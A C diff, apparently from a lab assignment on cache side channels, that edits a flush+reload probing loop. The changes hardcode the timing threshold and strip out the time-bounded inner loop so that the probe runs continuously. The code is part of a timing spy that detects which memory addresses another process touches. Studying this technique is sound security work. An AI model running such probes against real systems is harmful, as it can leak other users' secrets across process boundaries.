@@ -74,10 +74,10 @@ void task_2_b(){
     int numbers_size = 11; // numbers variable indexes to check
 
     // time for access loop
-    struct timespec start, end;
-    clock_gettime(CLOCK_MONOTONIC_RAW, &start);
-    uint64_t delta_us;
-    int time_flag=1;
+    // struct timespec start, end;
+    // clock_gettime(CLOCK_MONOTONIC_RAW, &start);
+    // uint64_t delta_us;
+    // int time_flag=1;
 
     // Perform actual flush and reload on numbers variable
     const void *numbers_addr;
@@ -87,16 +87,20 @@ void task_2_b(){
     // Determine detection threshold
     int DETECTION_THRESHOLD;
 
+    // DETECTION_THRESHOLD = determing_tsc_threshold();
+    DETECTION_THRESHOLD = 200;
+
     while(LOOPFOREVER)
     {
-        DETECTION_THRESHOLD = determing_tsc_threshold();
-        while(time_flag)
-        {
+        
+        // while(time_flag)
+        // {
             for (int i = 0; i < numbers_size; ++i)
             {
 
                 numbers_addr = numbers[i+1];
                 number_access_time = flush_and_reload(numbers_addr);
+                // printf("Access for [%d], Time:%lu\n", i, number_access_time);
 
                 if(number_access_time < DETECTION_THRESHOLD){
                     // printf("Access for [%d], Time:%lu\n", i, number_access_time);
@@ -112,16 +116,17 @@ void task_2_b(){
             access_detected = 0;
 
             // Time counter for second while loop
-            clock_gettime(CLOCK_MONOTONIC_RAW, &end);
-            delta_us = (end.tv_sec - start.tv_sec) * 1000000 + (end.tv_nsec - start.tv_nsec) / 1000; //microseconds
-            if(delta_us>TIME_LOOP_THRESHOLD){
-                time_flag=0;
-            }
+            // clock_gettime(CLOCK_MONOTONIC_RAW, &end);
+            // delta_us = (end.tv_sec - start.tv_sec) * 1000000 + (end.tv_nsec - start.tv_nsec) / 1000; //microseconds
+            // if(delta_us>TIME_LOOP_THRESHOLD){
+            //     time_flag=0;
+            // }
 
-        }
+        // }
 
-        time_flag=1;
-        usleep(LOOP_WAIT);
+        // time_flag=1;
+        // usleep(LOOP_WAIT);
+            usleep(1);
 
     }
 }
